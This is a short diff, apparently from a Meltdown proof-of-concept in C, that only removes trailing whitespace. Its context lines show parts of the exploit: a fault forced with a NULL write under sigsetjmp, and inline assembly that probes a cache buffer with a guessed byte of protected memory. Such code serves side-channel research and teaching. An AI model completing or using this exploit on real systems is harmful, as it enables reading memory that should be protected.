@@ -46,7 +46,7 @@ int main()
         if (sigsetjmp(jbuf, !0) == 0) {
             int *ptr = NULL;
             *ptr = 1; // force SIGSEGV by setting value by NULL pointer
-            
+
             // Force SIGSEGV is not required if address_to_guess_byte is protected
 
             // The code below should not be executed because of SEISEGV
@@ -61,7 +61,7 @@ int main()
                 "shlq $" PAGE_SIZE_SHIFT_STR ", %%rax \n"
                 "jz %=b                               \n"
                 "movq (%[buf], %%rax, 1), %%rbx       \n"
-                : 
+                :
                 :  [addr] "r" (address_to_guess_byte), [buf] "r" (meltdown_buf)
                 : "%rax", "%rbx");
 
